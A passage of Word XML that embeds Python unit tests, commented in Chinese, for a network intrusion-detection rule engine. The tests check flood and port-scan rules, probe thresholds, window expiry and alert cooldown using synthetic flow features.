        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_flood_needs_both_rate_and_packet_count():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF901C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = flow_rules(feats(**{"Total Fwd Packets": 500, "Flow Packets/s": 5000}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49464B9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "flood_single" in [h.rule for h in hits]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6ED25D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 只有包数没有速率：慢速大传输，不该报洪泛</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21893E33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "flood_single" not in [h.rule for h in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F834F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                  flow_rules(feats(**{"Total Fwd Packets": 500, "Flow Packets/s": 5}))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B90AE89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 只有速率没有包数：一条 SYN 也能算出巨大速率（时长为 0 的兜底），不该报</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BA9ADE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "flood_single" not in [h.rule for h in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0422B38C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                  flow_rules(feats(**{"Total Fwd Packets": 1, "Flow Packets/s": 5000}))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D50AE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="198B23F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B5513E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_lone_unanswered_syn_is_a_scan_probe():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C297811">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = flow_rules(feats(**{"Total Fwd Packets": 1, "Total Backward Packets": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C790C88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                               "SYN Flag Count": 1, "ACK Flag Count": 0}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3314EEE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "scan_single" in [h.rule for h in hits]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDB4E39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert pick(hits).category == "PortScan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E886FAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 同一个 SYN，但被应答过（ACK 置位）就不是探测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1509F4B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "scan_single" not in [h.rule for h in flow_rules(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474DE492">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        feats(**{"Total Fwd Packets": 1, "Total Backward Packets": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D2D790">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 "SYN Flag Count": 1, "ACK Flag Count": 1}))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413C43A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AC8E695">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02AAFC14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_zero_duration_micro_flow_counts_as_probe():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54205EB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """数据集口径：PortScan 的单行流时长在 50 微秒量级、只有一两个包。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648B24AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = flow_rules(feats(**{"Flow Duration": 49.0, "Total Fwd Packets": 1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BF748B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                               "Total Backward Packets": 1}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAEDFC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert pick(hits).category == "PortScan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E95AB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EEE3DF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0037CE24">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 窗口规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102ACD43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="333FA9C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79FB42F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def probe(**kw) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE0D643">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """窗口用例用：必须是"短但不是单包 SYN"的流，否则会被单流规则一起命中。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C667E4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f = feats(**{"Total Fwd Packets": 2, "Total Backward Packets": 1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23548BFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 "SYN Flag Count": 1, "ACK Flag Count": 1})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3408D81E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f.update(kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D80877">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F99D98C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635D7B81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5371779D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_port_scan_fires_on_the_twentieth_distinct_port():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680FC4BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    engine = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C527F4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    t = 1_000_000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64900725">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(19):     # 19 个端口：还差一个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6A4006">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert engine.observe("p1", t, key(dport=1000 + i), probe()) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F64DEB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = engine.observe("p1", t, key(dport=1019), probe())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3504C1B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert [h.rule for h in hits] == ["port_scan"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72622859">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert hits[0].observed == 20.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423823C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50D70EB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7249CA54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_port_scan_lookback_window_expires_old_probes():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F72F26C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    engine = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B285BCE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(19):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123FE31A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        engine.observe("p1", 1000.0, key(dport=1000 + i), probe())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5218CA5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 61 秒之后剩下的 19 条全部过期，重新计数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF50B1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert engine.observe("p1", 1061.0, key(dport=2000), probe()) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588A191C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78709395">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53D32237">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_window_rule_reports_once_per_cooldown():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C05E55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """一次 200 端口的扫描只该生成一条告警，否则看板会被刷满、反而看不出是一次扫描。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EB231B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    engine = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4445C426">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
